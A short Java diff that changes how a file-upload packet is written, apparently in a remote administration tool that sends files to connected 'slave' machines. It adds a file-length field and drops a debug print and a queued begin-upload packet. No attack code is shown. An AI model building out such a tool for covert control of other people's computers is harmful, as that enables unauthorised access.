@@ -23,7 +23,8 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 	@Override
 	public void write(final Slave slave, DataOutputStream dos) throws Exception {
 		slave.writeLine(remoteFile);
-		System.out.println(remoteFile);
+		dos.writeLong(file.length());
+		
 		if (file.exists() && file.isFile()) {
 			TransferData data = new TransferData();
 			PanelFileTransfer.instance.add(data);
@@ -34,8 +35,6 @@ public class Packet42ServerUploadFile extends AbstractOutgoingPacket {
 			data.setRunnable(new TransferRunnable(data) {
 				public void run() {
 					try {							
-						slave.addToSendQueue(new Packet102BeginServerUpload(file, remoteFile));
-
 						FileInputStream fileInput = new FileInputStream(file);
 						byte[] chunk = new byte[1024 * 8];
 
